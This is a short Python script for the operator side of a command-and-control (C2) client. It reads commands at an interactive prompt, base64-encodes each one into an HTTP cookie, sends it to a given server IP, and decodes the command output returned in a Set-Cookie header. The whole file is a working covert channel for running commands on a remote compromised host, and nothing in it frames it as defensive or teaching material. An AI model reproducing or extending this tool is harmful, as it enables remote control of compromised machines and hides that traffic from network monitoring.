import requests
import cmd
from base64 import urlsafe_b64decode, urlsafe_b64encode
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--serverip', required=True, help='Enter the server IP address')
parser.add_argument('-p', '--port', default=8000, help='Specify the port to connect on')
options = parser.parse_args()

ip = options.serverip
port = options.port

class C2(cmd.Cmd):
        prompt = '=>'

        def default(self, command):
                encoded_command = urlsafe_b64encode(command.encode()).decode()
                response = requests.get('http://{}:{}/'.format(ip, port), cookies={'Cookie': encoded_command})
                headers = response.headers
                encoded_output = headers['Set-Cookie']
                output = urlsafe_b64decode(encoded_output.encode()).decode()
                print(output)

C2().cmdloop()
